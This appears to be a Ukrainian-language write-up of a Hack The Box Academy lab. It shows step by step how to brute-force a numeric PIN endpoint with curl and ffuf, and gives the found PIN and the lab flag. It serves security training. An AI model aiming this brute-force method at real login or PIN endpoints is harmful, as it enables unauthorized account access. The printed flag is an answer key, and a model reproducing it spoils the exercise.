# PIN Brute Force (Basic Script Brute Forcing)

## Модуль
[Login Brute Forcing — Basic Script Brute Forcing](https://academy.hackthebox.com/app/module/57/section/498)

## Концепція

Brute force числового PIN через GET-параметр. API повертає JSON —
фільтрація за текстом відповіді (`-fr`), а не за розміром.

## Алгоритм

```bash
# Крок 1 — розвідка ендпоінту
curl -s http://TARGET:PORT/pin
# → {"message":"Incorrect PIN!"} — знайшли endpoint і failure string

# Крок 2 — визначити метод
curl -s "http://TARGET:PORT/pin?pin=0000"
# → {"message":"Incorrect PIN!"} — GET працює

# Крок 3 — генерація PIN wordlist (0000-9999)
for i in $(seq -w 0 9999); do echo $i; done > pins.txt

# Крок 4 — brute force з фільтром по regexp
ffuf -w pins.txt:FUZZ \
  -u "http://TARGET:PORT/pin?pin=FUZZ" \
  -fr "Incorrect" \
  -t 64
```

## Результат
8088                    [Status: 200, Size: 65, Words: 2, Lines: 2, Duration: 26ms]

```bash
# Забрати флаг
curl -s "http://TARGET:PORT/pin?pin=8088"
# → {"flag":"HTB{Brut3_F0rc3_1s_P0w3rfu1}","message":"Correct PIN!"}
```

**Flag:** `HTB{Brut3_F0rc3_1s_P0w3rfu1}`

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | `seq -w` — додає leading zeros (0000, 0001...) — критично для PIN |
| 2 | JSON API — фільтрувати по `-fr "Incorrect"` (regexp), не по `-fs` |
| 3 | POST може бути заблокований (405) — завжди перевіряти GET варіант |
| 4 | `-t 64` — збільшений thread count для швидкості на числових списках |

## Помилка яку варто запам'ятати

> `PATH` може бути скинутий у новому терміналі — якщо `curl: command not found`:
> ```bash
> export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
> ```
